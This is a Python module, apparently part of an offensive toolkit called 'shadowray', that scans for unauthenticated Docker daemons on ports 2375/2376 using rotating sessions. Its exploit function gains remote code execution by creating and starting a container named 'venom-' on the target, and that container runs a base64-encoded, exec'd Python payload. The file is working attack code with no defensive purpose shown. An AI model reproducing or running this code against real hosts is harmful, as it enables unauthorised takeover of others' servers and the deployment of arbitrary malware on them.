"""Docker sweep — unauthenticated Docker daemon detection (port 2375/2376)."""
import json
import logging
import socket
import time
from typing import Any, Dict

from .rotation import RotatingSession, build_rotating_session
from .ledger import Ledger

log = logging.getLogger("shadowray.docker")

_docker_session: RotatingSession | None = None


def _get_docker_session() -> RotatingSession:
    global _docker_session
    if _docker_session is None:
        _docker_session = build_rotating_session()
    return _docker_session


def check_docker(ip: str, port: int, timeout: int = 8.0) -> Dict[str, Any] | None:
    """Validate that ip:port is an unauthenticated Docker daemon."""
    scheme = "https" if port == 2376 else "http"
    base = f"{scheme}://{ip}:{port}"
    session = _get_docker_session()
    try:
        r = session.get(f"{base}/version", timeout=timeout, verify=False)
        if r.ok:
            d = r.json()
            return {
                "docker": True,
                "version": d.get("Version", ""),
                "api_version": d.get("ApiVersion", ""),
                "os": d.get("Os", ""),
                "arch": d.get("Arch", ""),
            }
    except Exception:
        pass
    return None


def exploit(ip: str, port: int, payload_src: str) -> bool:
    """Unauthenticated Docker daemon RCE via /containers/create + /start."""
    import base64
    import requests
    scheme = "https" if port == 2376 else "http"
    base = f"{scheme}://{ip}:{port}"
    try:
        b64 = base64.b64encode(payload_src.encode()).decode()
        entrypoint = f"python -c \"import base64;exec(base64.b64decode('{b64}').decode())\""
        body = {
            "Image": "alpine:latest",
            "Entrypoint": ["/bin/sh", "-c", entrypoint],
            "AttachStdout": True,
            "AttachStderr": True,
            "Tty": False,
        }
        r = requests.post(f"{base}/containers/create?name=venom-{port}",
                         json=body, timeout=15, headers={"Content-Type": "application/json"})
        if r.ok:
            cid = r.json().get("Id", "")
            requests.post(f"{base}/containers/{cid}/start", timeout=15,
                         headers={"Content-Type": "application/json"})
            return True
    except Exception:
        pass
    return False
